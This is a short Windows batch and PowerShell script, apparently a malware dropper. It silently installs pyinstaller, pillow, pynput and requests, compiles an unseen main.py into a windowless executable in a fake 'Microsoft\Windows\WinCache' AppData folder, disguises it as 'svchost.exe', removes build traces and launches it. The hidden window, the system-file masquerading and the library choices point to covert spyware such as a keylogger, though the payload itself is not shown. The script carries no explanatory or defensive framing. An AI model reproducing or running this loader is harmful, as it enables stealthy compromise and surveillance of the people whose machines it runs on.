@echo off
powershell -WindowStyle Hidden -Command "
$cache = Join-Path $env:APPDATA 'Microsoft\Windows\WinCache'
$exe = Join-Path $cache 'svchost.exe'
$src = Join-Path '%~dp0' 'main.py'
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
if (Test-Path $exe) {
    Start-Process $exe
} else {
    python -m pip install pyinstaller pillow pynput requests 2>$null
    Copy-Item $src $cache -Force
    $tmp = Join-Path $cache 'build'
    python -m PyInstaller --onefile --noconsole --distpath $cache --workpath $tmp --specpath $cache (Join-Path $cache 'main.py') 2>$null
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $cache 'main.spec') -Force -ErrorAction SilentlyContinue
    Rename-Item (Join-Path $cache 'main.exe') $exe -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 10
    if (Test-Path $exe) { Start-Process $exe }
}
"